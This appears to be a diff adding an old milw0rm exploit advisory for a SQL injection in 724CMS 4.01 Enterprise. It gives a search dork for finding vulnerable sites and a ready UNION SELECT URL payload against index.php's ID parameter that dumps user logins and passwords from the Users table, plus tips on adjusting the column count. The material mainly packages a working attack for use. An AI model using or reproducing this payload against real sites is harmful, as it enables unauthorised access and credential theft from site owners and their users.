@@ -1,0 +1,31 @@
+###################################################################################
+#										  #
+#           724CMS <= 4.01 Enterprise  - SQL Injection Vulnerability              #
+#										  #
+#    found by:       Lidloses_Auge 					          #
+#    Date:           07.04.2008							  #
+#    Greetz to:      free-hack.com						  #
+#										  #
+###############################################################################################################################################
+#																	      #
+# Vulnerability:															      #
+#																	      #
+#    Document:      index.php														      #
+#    GET-Parameter: ID														              #
+#																	      #
+# Dork:																	      #
+#																	      #
+#    724CMS + "Version 4.01"                    											      #
+#																	      #
+# Example:																      #
+#																	      #
+#    http://[target]/index.php?ID=null+union+select+1,2,3,4,5,6,7,8,9,10,11,concat_ws(0x202d20,ID,User_Login,User_Password),13,14,	      #
+#    15,16,17,18,19,20,21,22,23,24,25,26,27,28+FROM+Users--							                              #
+#																	      #
+# Notes:																      #
+#																	      #
+#    The number of columns isn't always 28. In some cases it can be also about 37. Check before you try. Some of 'em are blind injections.    #
+#																	      #
+###############################################################################################################################################
+
+# milw0rm.com [2008-04-07]
